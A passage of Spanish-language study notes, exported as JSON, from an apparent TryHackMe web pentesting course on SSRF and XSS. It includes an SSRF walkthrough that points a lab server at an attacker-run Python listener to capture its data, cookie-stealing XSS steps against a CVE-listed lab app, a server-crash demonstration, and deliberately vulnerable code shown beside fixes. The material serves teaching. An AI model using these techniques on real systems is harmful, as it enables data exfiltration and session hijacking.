true);\n$response = curl_exec($ch); \n...\n?>\n```\n\n- El an√°lisis del c√≥digo fuente de la p√°gina muestra que est√° leyendo par√°metros `url` y sin realizar ninguna validaci√≥n, manda la informaci√≥n al servidor mencionado en el par√°metro de la URL.\n- Aqu√≠, el atacante puede redirigir la petici√≥n a su servidor, consiguiendo as√≠ informaci√≥n adicional para la explotaci√≥n.\n- En tu m√°quina, cera un nuevo archivo llamado `server.py` y a√±ade el siguiente c√≥digo:\n\n```python\nfrom http.server import SimpleHTTPRequestHandler, HTTPServer\nfrom urllib.parse import unquote\nclass CustomRequestHandler(SimpleHTTPRequestHandler):\n\n    def end_headers(self):\n        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin\n        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')\n        self.send_header('Access-Control-Allow-Headers', 'Content-Type')\n        super().end_headers()\n\n    def do_GET(self):\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b'Hello, GET request!')\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length).decode('utf-8')\n\n        self.send_response(200)\n        self.end_headers()\n\n        # Log the POST data to data.html\n        with open('data.html', 'a') as file:\n            file.write(post_data + '\\n')\n        response = f'THM, POST request! Received data: {post_data}'\n        self.wfile.write(response.encode('utf-8'))\n\nif __name__ == '__main__':\n    server_address = ('', 8080)\n    httpd = HTTPServer(server_address, CustomRequestHandler)\n    print('Server running on http://localhost:8080/')\n    httpd.serve_forever()\n```\n\n- El c√≥digo de arriba recibir√° todo el contenido y lo guardar√° en `data.html` en el servidor. Para obtener la informaci√≥n, necesitamos arrancar un servidor ligero. Podemos hacerlo con: `sudo chmod +x server.py && sudo python3 server.py`.\n- Ahora abre el navegador y ve a `http://hrms.thm/profile.php?url=http://IP:8000`, lo que registrar√° la informaci√≥n en `data.html`. Abre el archivo `data.html` que contiene la informaci√≥n del servidor que usaremos para ataques futuros.\n\n![[Pasted image 20260123113739.png]]\n\n--------------------------------------------\n<h2>Semi-Blind SSRF (Basada en Tiempo)</h2>\nLa SSRF time-based es una variaci√≥n de SSRF donde el atacante usa peticiones relacionadas con tiempo para inferir el √©xito o fracaso de la petici√≥n maliciosa. Observando c√≥mo de largo se toma para responder podemos concluir si nuestras peticiones son correctas o no.",
    "modified": "2026-01-24T00:53:46"
  },
  {
    "title": "0. SSRF",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/0-ssrf/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/0. SSRF.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/1. Introduction]]\n[[2. Anatomy of SSRF Attack]]\n[[3. Types of SSRF - Basic]]\n[[4. Types of SSRF - Basic - continued]]\n[[5. Types of SSRF - Blind]]\n[[6. A Classic Example - Crashing the Server]]\n[[7. Remedial Measures]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Anatomy of SSRF Attack",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/2-anatomy-of-ssrf-attack/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/2. Anatomy of SSRF Attack.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "Al desarrolar software de red es com√∫n hacer peticiones a servidores externos. Los desarrolladores suelen usar estas peticiones para obtener recursos remotos como actualizaciones de software o informaci√≥n importante de otras aplicaciones. Aunque estas peticiones suelen ser segurasm la implementaci√≥n indebida puede llevar a SSRF.\n\n![[Pasted image 20260122124036.png]]\n\nUna vulnerabilidad SSRF puede surgir cuando la informaci√≥n dada por el usuario se utiliza para construir una petici√≥n, como formar una URL. Para ejecutar un ataque SSRF, in atacante puede manipular el valor de un par√°metro en el software vulnerable.\n\nLas vulnerabilidades SSRF pueden ser encontradas en varios tipos de software y lenguajes de programaci√≥n, aunque la mayor√≠a se encuentran en aplicaciones web.\n\n------------------------------------------------\n<h2>OWASP Ranking</h2>\nSSRF es una amenaza de seguridad seria, mereciendo su lugar en la lista del OWASP Top 10.\n\n| **Max Incidence Rate** | **Avg Incidence Rate  <br>** | **Avg Weighted Exploit** | **Avg Weighted Impact  <br>** | **Max Coverage  <br>** | **Total Occurrences  <br>** | **Total CVEs** |\n| ---------------------- | ---------------------------- | ------------------------ | ----------------------------- | ---------------------- | --------------------------- | -------------- |\n| 2.72%                  | 2.72%                        | 8.28                     | 6.72                          | 67.2%                  | 9503                        | 385            |\n\nLa tabla de arriba ofrece una vista detallada de la prevalencia, impacto y cubierta de una vulnerabilidad SSRF en un contexto espec√≠fico. La interpretaci√≥n es la siguiente:\n\n- **Max Incidence Rate:** Sugiere c√≥mo de habitualmente esta vulnerabilidad ha sido encontrada relativa a otras vulnerabilidades.\n- **Avg Incidence Rate:** Muestra c√≥mo de com√≠n es esta vulnerabilidad comparada con otras.\n- **Avg Weighted Exploit:** Indica la dificultad media o esfuerzo requerido para explotar una vulnerabilidad SSRF.\n- **Avg Weighted Impact:** Potencial medio de impacto oo severidad de explotar una vulnerabilidad SSRF.\n- **Max Coverage:** Indica cu√°ntos de los sistemas han sido explotados debido a esta vulnerabilidad.\n- **Total Occurrences:** Explotaciones totales debido a esta vulnerabilidad que OWASP ha analizado.\n- **Total CVEs:** CVEs totales sobre SSRF. Estos son CVE-2021-21311, CVE-2018-11759 y CVE-2017-9506 (informaci√≥n de 2021).\n\n----------------------------------------\n<h2>Riesgo de SSRF</h2>\n<h4>Exposici√≥n de Informaci√≥n</h4>\nComo hemos explicado antes, los cibercriminales pueden ganar acceso no autorizado alterando las peticiones en nombre de la aplicaci√≥n web vulnerable para ganar acceso a informaci√≥n sensible hosteada en la red interna.\n<h4>Reconocimiento</h4>\nUn atacante puede llevar acabo escaneo de redes internas ejecutando scripts maliciosos en servidores vulnerables o redirigiendo a scripts hosteados en un servidor externo.\n<h4>Denegaci√≥n de Servicio</h4>\nEs un escenario com√∫n en el que los servidores o redes no esperan tantas peticiones. Los atacantes inundan los servidores con demasiadas peticiones (leg√≠timas), haciendo que se caigan incapaces de manejar peticiones genuinas.",
    "modified": "2026-01-23T00:56:08"
  },
  {
    "title": "7. Remedial Measures",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/7-remedial-measures/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/7. Remedial Measures.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "Las medidas de mitigaci√≥n para SSRF son esenciales para preservar la seguridad e integridad de las aplicaciones web. Implementar mitigaciones SSRF robustas ayuda a proteger contra ests riesgos fortificando las defensas de la aplicaci√≥n, previniendo peticiones maliciosas.\n\n- **Implementar validaci√≥n de input estricta:** Y adem√°s sanitizar todo el input dado por el usuario en URLs o par√°metros.\n- **Whitelists:** Implementar listas de dominios permitidos en lugar de intentar bloquear aquellos considerados peligrosos.\n- **Segmentaci√≥n de red:** Segmentar la red hace que un dispositivo interno no pueda ver todos los dem√°s sino su segmento s√≥lo.\n- **Security headers:** A√±adir headers a las peticiones como `Content-Security-Policy`.\n- **Access control:** Implementar controles de acceso robustos para recursos internos.\n- **Registros:** Implementar registros y monitorizaci√≥n para rastrear peticiones entrantes.",
    "modified": "2026-01-24T00:53:46"
  },
  {
    "title": "6. A Classic Example - Crashing the Server",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/6-a-classic-example-crashing-the-server/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/6. A Classic Example - Crashing the Server.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "Un atacante podr√≠a abusar SSRF crasheando el servidor o creando una DoS a otros hosts. Hay muchas instancias ([WordPress](https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/), [CairoSVG](https://github.com/Kozea/CairoSVG/security/advisories/GHSA-rwmf-w63j-p7gv)) donde los atacantes cortan la disponibilidad de un sistema lanzando ataques SSRF.\n\n-----------------------------------------\n<h2>Crasheando el Servidor</h2>\nEn esta demostraci√≥n SSRF vamos a ilustrar c√≥mo un atacante puede explotar una aplicaci√≥n web para causar una denegaci√≥n de servicio en el servidor. En nuestro escenario, la vulnerabilidad se explota dando una URL maliciosa que apunta al recurso que al ser accedido por el servidor,  lleva a un consumo de recursos excesivos o dispara un crasheo.\n\nPor ejemplo, el atacante puede introducir una URL que apunta a un gran archivo en un servidor lento o servicio que responde con una carga abrumadora de informaci√≥n. Cuando la aplicaci√≥n vulnerable accede a esta URL, entra en una acci√≥n que consume todos sus recursos, conllevando lentitud o crash.\n\n<h4>C√≥mo Funciona</h4>\n- Una vez que nos logueamos en la dashboard, veremos una pesta√±a llamada `Training` en la barra de navegaci√≥n, que es usada para cargar el contenido de entrenamiento para los empleados.\n- Una vez que clickemos en esa pesta√±a, veremos que nos redirigue a `http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg`.\n  ![[Pasted image 20260123122051.png]]\n- Notamos que el archivo `url.php` est√° cargando contenido externo mostrado aqu√≠. ¬øQu√© pasa si intentamos cargar otro contenido?\n- Intenta abrir el archivo `http://hrms.thm/url.php?id=10.10.10.10`.\n  ![[Pasted image 20260123122153.png]]\n- Ahora que sabemos que el servidor es vulnerable a SSRF b√°sica, exploremos el c√≥digo de `url.php` para hacer que crashee el servidor.\n- Una vez que accedemos a la URL `http://hrms/?url=localhost/url`, veremos el siguiente c√≥digo en el footer (s√≥lo funciona si el usuario no est√° logueado).\n\n```php\n<?php\n....\n....\n    if ($imageSize < 100) {\n\t\t  // Output the image if it's within the size limit\n    \n\t\t$base64Image = downloadAndEncodeImage($imageUrl);\n        echo '<img src=\"' . htmlspecialchars($base64Image) . '\" alt=\"Image\" style=\"width: 100%; height: 100%; object-fit: cover;\">';\n\n    } else {\n\t \t// Memory Outage - server will crash\n    \n....\n...\n```\n\n- El c√≥digo de arriba muestra que `url.php` carga una imagen. Si el tama√±o de la imagen supera los `100KB`, muestra un mensaje de falta de memoria.\n- Trataremos de crashear el servidor cargando una imagen mayor que `100KB`. Para tu conveniencia, ya hemos puesto esa imagen en `http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg`.\n  ![[Pasted image 20260123123501.png]]",
    "modified": "2026-01-24T00:53:46"
  },
  {
    "title": "0. Whats Your Name",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/5-whats-your-name/0-whats-your-name/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/5. Whats Your Name/0. Whats Your Name.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 5. Whats Your Name",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/0. Whats Your Name]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/5. Whats Your Name/1. Redirection]]",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "1. Redirection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/5-whats-your-name/1-redirection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/5. Whats Your Name/1. Redirection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 5. Whats Your Name",
    "content": "Para ver este curso ve a **THM -> Maquinas/2. Medium -> 9. Whats Your Name -> 1. Getting the Flags**",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "2. Terminology and Types",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/2-terminology-and-types/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/2. Terminology and Types.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "XSS es una vulnerabilidad que permite al atacante inyectar scripts maliciosos en una p√°gina web benigna vista por otro usuario. Por consecuencia, sobrepasan el **Same-Origin Policy (SOP)**, que es un mecanismo de seguridad para prevenir que scripts maliciosos de una p√°gina que obtengan acceso a informaci√≥n sensible en otra p√°gina.\n\n-------------------------------\n<h2>JavaScript para XSS</h2>\nSe requiere conocimiento b√°sico sobre JavaScript para entender los exploits XSS y adaptarlos a nuestras necesidades. XSS es un ataque del lado del clliente que toma lugar en el navegador del objetivo. Diferentes navegadores procesan los trozos de c√≥digo de manera diferente, por lo que un exploit puede funcionar en un navegador mientras que otro no.\n\nSi quieres experimenta con JS en tu navegador abre la consola con F12. O con los siguientes atajos:\n\n- En Firefox, presiona Ctrl + Shift + K\n- En Google Chrome, presiona Ctrl + Shift + J\n- En Safari, presiona Command + Option + J\n\nVeamos algunas funciones esenciales:\n\n- **Alert:** Puedes usar `alert(1)` o `alert(\"XSS\")` para mostrar una alerta en el navegador, como un pop-up.\n- **Console log:** Puedes usar `console.log(1)` o `console.log(\"text\")` para mostrar lo que queramos en la consola.\n- **Encoding:** La funci√≥n `btoa(\"string\")` puede usarse para encodear una string a base64. La funci√≥n inversa es `atob(\"base64\")`.\n\nAdem√°s puedes experimentar con mostrar valores como `document.cookie` con `alert(document.cookie)`.\n\n------------------------------------\n<h2>Tipos de XSS</h2>\nPara repasar lo que ya sabemos, hay tres tipos de XSS principales:\n\n- **Reflected XSS:** Este ataque recae en que el input controlado por el usuario sea reflejado en la web. Por ejemplo si buscas un t√©rmino y la p√°gina lo muestra escrito en el HTML.\n- **Stored XSS:** Recae en que el input del usuario sea guardado en la base de datos de la p√°gina web. Por ejemplo si los usuarios pueden escribir rese√±as y se muestran en la p√°gina a otros usuarios.\n- **DOM-Based XSS:** Este ataque explota vulnerabilidades en el Document Object Model (DOM) para manipular los elementos de la web existente sin necesitar ser reflejados o guardados en el servidor. Es la menos com√∫n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Causes and Implications",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/3-causes-and-implications/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/3. Causes and Implications.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "<h2>¬øQu√© Hace Posible el XSS?</h2>\nHay muchas razones por las que todav√≠a se ven vulnerabilidades XSS en las p√°ginas Web. Debajo una lista de ellas.\n\n<h4>Insufficient Input Validation and Sanitization</h4>\nLas aplicaciones web aceptan input del usuario v√≠a formularios y la usan en la generaci√≥n din√°mica de p√°ginas HTML. Consecuentemente, los scripts maliciosos pueden ser incrustados como parte de un input leg√≠timo y ser eventualmente ejecutados por el navegador a no ser que se saniticen correctamente.\n<h4>Lack of Output Encoding</h4>\nEl usuario puede usar varios caracteres para alterar c√≥mo el navegador web procesa y muestra una p√°gina. Por la parte de HTML es cr√≠tico encodear correctamente caracteres como `<`, `>`, `\"`, `'` y `&`. Para JavaScript requieren especial atenci√≥n `'`, `\"` y `\\`. \n<h4>Improper Use of Security Headers</h4>\nVarios headers de seguridad pueden ayudar a mitigar las vulnerabilidades XSS. Por ejemplo, Consent Security Policy (SCP) mitiga riesgos XSS definiendo qu√© fuentes son confiadas por scripts ejecutables. Un SCP mal configurado o con pol√≠ticas muy permisibas o uso inadecuado de `unsafe-inline` o `unsafe-eval` puede ser m√°s f√°cilmente vulnerado.\n<h4>Framework and Language Vulnerabilities</h4>\nAlgunos frameworks antiguos no ofrecen mecanismos de seguridad contra XSS y otros tienen vulnerabilidades XSS no parcheadas. Los frameworks modernos autom√°ticamente escapan XSS por dise√±o y parchean cualquier vulnerabilidad descubierta.\n<h4>Third-Party Libraries</h4>\nIntegrar librer√≠as de terceros en una aplicaci√≥n web puede introducir vulnerabilidades XSS, incluso si la aplicacii√≥n en s√≠ no es vulnerable.\n\n---------------------------------------\n<h2>Implicaciones del XSS</h2>\nHay muchas implicaciones de XSS. Debajo una lista de ellas:\n\n<h4>Session Hijacking</h4>\nUn XSS puede ser usado para robar cookies de sesi√≥n, con la que los atacantes pueden tomar control de ella.\n<h4>Phissing and Credential Theft</h4>\nUsando XSS, los atacantes pueden presentar un prompt de login falso al usuario.\n<h4>Social Engineering</h4>\nUsando XSS, un atacante puede crear un pop-up o alerta de apariencia leg√≠tima en una web\n<h4>Content Manipulation and Defacement</h4>\nAdem√°s puede hacerse para causar da√±os de reputacion, etc.\n<h4>Data Exfiltration</h4>\nPuede acceder y filtrar informaci√≥n  como datos personales o informaci√≥n financiera.\n<h4>Malware Installation</h4>\nUn atacante sofisticado puede usar XSS para esparcir malware.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "El cross-site scripting sigue siendo una de las vulnerabilidades m√°s comunes que acechan aplicaciones web hoy en d√≠a. Dependen de inyectar un script malicioso en un sitio benigno para que se ejecute en el navegador del usuario.\n\nUna de las primeras vulnerabilidades XSS fue reconocida en 1999 y llev√≥ a CERT advisory [CA-2000-02](https://vuls.cert.org/confluence/display/historical/CERT+Advisory+CA-2000-02+Malicious+HTML+Tags+Embedded+in+Client+Web+Requests). Durante las √∫ltimas d√©cadas varias pr√°cticas de seguridad se han convertido parte de los frameworks de aplicaci√≥n, protegiendo contra muchas vulnerabilidades XSS por defecto, aunque tambi√©n ha crecido la sofisticaci√≥n de los ataques.\n\nSe descubren y explotan vulnerabilidades XSS mensualmente. En el OWASP Top 10 de 2021, se clasific√≥ tercera.\n\n--------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/0. HTTP in Detail]]\n- [[Ciberseguridad/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n- [[0. JavaScript Essentials]]\n- [[Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/0. Intro to Cross-site Scripting]]\n\n-----------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nAl completar esta unidad se espera haber ganado conocimientos m√°s en profundidad sobre:\n\n- Reflected XSS\n- Stored XSS\n- DOM-Based XSS\n- C√≥mo protegerse contra el XSS",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Vulnerable Web Application 2",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/7-vulnerable-web-application-2/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/7. Vulnerable Web Application 2.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "La m√°quina virtual de esta tarea corre el proyecto vulnerable [Hospital Management System](https://github.com/kishan0725/Hospital-Management-System). Fue subido hace unos a√±os y no ha sido actualizado desde entonces. Es funcional, pero una vulnerabilidad stored XSS fue descubierta y nombrada [CVE-2021-38757](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38757) y el exploit fue publicado [aqu√≠](https://packetstormsecurity.com/files/163869/Hospital-Management-System-Cross-Site-Scripting.html).\n\nPara explotar la vulnerabilidad s√≥lo hay que hacer click en \"Contact\" y rellenar el nombre, email, n√∫mero de tel√©fono y subir el payload en el campo del mensaje.\n\nCualquier mensaje le aparece al recepcionista. Para iniciar sesi√≥n como dicho recepcionista, utiliza las credenciales:\n\n- Username: `admin`\n- Password: `admin123`\n\nLa aplicaci√≥n vulnerable corre en el puerto `80`.\n\nLa vulnerabilidad se encuentra en `contact.php`. \n\n```php\n<?php \n$con=mysqli_connect(\"localhost\",\"root\",\"\",\"myhmsdb\");\nif(isset($_POST['btnSubmit']))\n{\n    $name = $_POST['txtName'];\n    $email = $_POST['txtEmail'];\n    $contact = $_POST['txtPhone'];\n    $message = $_POST['txtMsg'];\n\n    $query=\"insert into contact(name,email,contact,message) values('$name','$email','$contact','$message');\";\n\n//...\n}\n```\n\n-----------------------------------------\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251211162345.png]]\n2. Le damos a \"CONTACT\".\n   ![[Pasted image 20251211162410.png]]\n3. Rellenamos los campos y el payload.\n   ![[Pasted image 20251211163053.png]]\n4. Mandamos el mensaje.\n   ![[Pasted image 20251211163120.png]]\n5. Iniciamos sesi√≥n como el recepcionista.\n   ![[Pasted image 20251211162846.png]]\n6. Nos sale la cookie.\n   ![[Pasted image 20251211163158.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Stored XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/6-stored-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/6. Stored XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "Stored XSS o Persistent XSS es una vulnerabilidad de aplicaciones web que ocurre cuando la aplicaci√≥n guarda input dado por el usuario y lo incrusta directamente en p√°ginas servidas a otros usuarios sin sanitizarlo correctamente. Cuando estos usuarios acceden al contenido malicioso lo ejecutan sin querer. Algunos ejemplos son foros web, rese√±as de productos, comentarios, etc.\n\n--------------------------------------\n<h2>Vulnerable Web Application</h2>\nHay varias razones por las que una aplicaci√≥n web es vulnerable a stored XSS. Algunas de las mejores pr√°cticas para prevenirla son:\n\n- **Validar y sanitizar el input:** Define reglas claras y validaci√≥n estricta en toda la informaci√≥n recibida del usuario, incluso si aparentemente no lo puede modificar directamente.\n- **Usar escape de output:** Al mostrar input dado por el usuario, en un contexto HTML, encodea todos los caracteres HTML-espec√≠ficos como `<`, `>` y `&`.\n- **Aplicar encoding espec√≠fico al contexto:** Si usamos JavaScript debemos usar JavaScript encoding y si tenemos URLs, URL encoding.\n- **Practicar defensa en profundidad:** No conf√≠es en una √∫nica capa de defensa. Haz validaci√≥n del lado del servidor tambi√©n.\n\nEn los siguientes ejemplos listamos trazas de c√≥digo vulnerables en varios lenguajes.\n\n>[!CAUTION] No lo veremos tan en profundidad por ser la soluci√≥n la misma que en la implementaci√≥n de Reflected XSS.\n\n\n-----------------------------------------\n<h2>PHP</h2>\n<h4>C√≥digo Vulnerable</h4>\nEl c√≥digo de abajo tiene varias vulnerabilidades. Hace tres cosas:\n\n- Lee un comentario del usuario y lo guarda en la variable `$comment`.\n- A√±ade `$comment` a la columna `comment` en la tabla `comments` en la base de datos.\n- Luego, itera sobre las filas en la columna `comment` y las muestra en pantalla.\n\n```php\n// Storing user comment\n$comment = $_POST['comment'];\nmysqli_query($conn, \"INSERT INTO comments (comment) VALUES ('$comment')\");\n\n// Displaying user comment\n$result = mysqli_query($conn, \"SELECT comment FROM comments\");\nwhile ($row = mysqli_fetch_assoc($result)) {\n    echo $row['comment'];\n}\n```\n\n<h4>C√≥digo Arreglado</h4>\n```php\n// Storing user comment\n$comment = mysqli_real_escape_string($conn, $_POST['comment']);\nmysqli_query($conn, \"INSERT INTO comments (comment) VALUES ('$comment')\");\n\n// Displaying user comment\n$result = mysqli_query($conn, \"SELECT comment FROM comments\");\nwhile ($row = mysqli_fetch_assoc($result)) {\n    $sanitizedComment = htmlspecialchars($row['comment']);\n    echo $sanitizedComment;\n}\n```\n\nAntes de mostrar todos los comentarios en pantalla, los pasamos por la funci√≥n `htmlspecialchars()`. No entra en el foco de esta tarea, sin embargo, si tienes curiosidad por saber como mitigar la SQL Injection, se puede hacer con `mysql_real_escape_string()`.\n\n------------------------------------\n<h2>JavaScript (Node.js)</h2>\n<h4>C√≥digo Vulnerable</h4>\nEl siguiente c√≥digo JavaScript lee un comentario recibido de un usuario que fue guardado en una tabla de una base de datos. Asumimos que el array `comments` ha sido poblado desde la base de datos.\n\n```javascript\napp.get('/comments', (req, res) => {\n  let html = '<ul>';\n  for (const comment of comments) {\n    html += `<li>${comment}</li>`;\n  }\n  html += '</ul>';\n  res.send(html);\n});\n```\n\nEl problema principal es este c√≥digo es que lee el input del usuario guardado en `comment` y lo muestra como parte del c√≥digo HTML. Por lo que cualquier usuario que lo vea ejecutar√° cualquier script inyectado.\n\n<h4>C√≥digo Arreglado</h4>\n```javascript\nconst sanitizeHtml = require('sanitize-html');\n\napp.get('/comments', (req, res) => {\n  let html = '<ul>';\n  for (const comment of comments) {\n    const sanitizedComment = sanitizeHtml(comment);\n    html += `<li>${sanitizedComment}</li>`;\n  }\n  html += '</ul>';\n  res.send(html);\n});\n```\n\nParte de la soluci√≥n es sanitizar el HTML antes de mostrarlo al usuario. Podemos eliminar elementos HTML antes de mostr√°rselos al usuario usando `sanitizeHTML()`.\n\n--------------------------------------------\n<h2>Python (Flask)</h2>\n<h4>C√≥digo Vulnerable</h4>\nSimilar a las trazas de c√≥digo que hemos mostrado, el siguiente c√≥digo usa el framework Flask.\n\n```python\nfrom flask import Flask, request, render_template_string\nfrom flask_sqlalchemy import SQLAlchemy\n\napp = Flask(__name__)\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'\ndb = SQLAlchemy(app)\n\nclass Comment(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    content = db.Column(db.String, nullable=False)\n\n@app.route('/comment', methods=['POST'])\ndef add_comment():\n    comment_content = request.form['comment']\n    comment = Comment(content=comment_content)\n    db.session.add(comment)\n    db.session.commit()\n    return 'Comment added!'\n\n@app.route('/comments')\ndef show_comments():\n    comments = Comment.query.all()\n    return render_template_string(''.join(['<div>' + c.content + '</div>' for c in comments]))\n```\n\nEl primer problema es que `comment_content` est√° configurado a la subida rescatada del formulario `request.form['comment']` del usuario sin sanitizaci√≥n. Adem√°s cuando un usuario quiere verlos, se muestran sin sanitizarse.\n\n<h4>C√≥digo Arreglado</h4>\n```python\nfrom flask import Flask, request, render_template_string, escape\nfrom flask_sqlalchemy import SQLAlchemy\nfrom markupsafe import escape\n\napp = Flask(__name__)\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'\ndb = SQLAlchemy(app)\n\nclass Comment(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    content = db.Column(db.String, nullable=False)\n\n@app.route('/comment', methods=['POST'])\ndef add_comment():\n    comment_content = request.form['comment']\n    comment = Comment(content=comment_content)\n    db.session.add(comment)\n    db.session.commit()\n    return 'Comment added!'\n\n@app.route('/comments')\ndef show_comments():\n    comments = Comment.query.all()\n    sanitized_comments = [escape(c.content) for c in comments]\n    return render_template_string(''.join(['<div>' + comment + '</div>' for comment in sanitized_comments]))\n```\n\nUsamos la funci√≥n `escape()` para asegurar que cualquier car√°cter se reemplace con entidades HTML (`>` -> `&gt;`). Aunque el input se guarde tal cual, se sanitiza antes de mandarse de vuelta al cliente.\n\n-------------------------------------------\n<h2>C# (ASP.NET)</h2>\n<h4>C√≥digo Vulnerable</h4>\nEl siguiente c√≥digo de C# tiene m√∫ltiples vulnerabilidades.\n\n```csharp\npublic void SaveComment(string userComment)\n{\n    var command = new SqlCommand(\"INSERT INTO Comments (Comment) VALUES ('\" + userComment + \"')\", connection);\n    // Execute the command\n}\n\npublic void DisplayComments()\n{\n    var reader = new SqlCommand(\"SELECT Comment FROM Comments\", connection).ExecuteReader();\n    while (reader.Read())\n    {\n        Response.Write(reader[\"Comment\"].ToString());\n    }\n    // Execute the command\n}\n```\n\nUna de ellas es stored XSS. El sistema guarda lo que introduzca el usuario sin cambios y m√°s adelante lo muestra a otros usuarios. Otra vulnerabilidad es SQLi aunque no entra en el alcance de esta tarea.\n\n<h4>C√≥digo Arreglado</h4>\n```csharp\nusing System.Web;\n\npublic void SaveComment(string userComment)\n{\n    var command = new SqlCommand(\"INSERT INTO Comments (Comment) VALUES (@comment)\", connection);\n    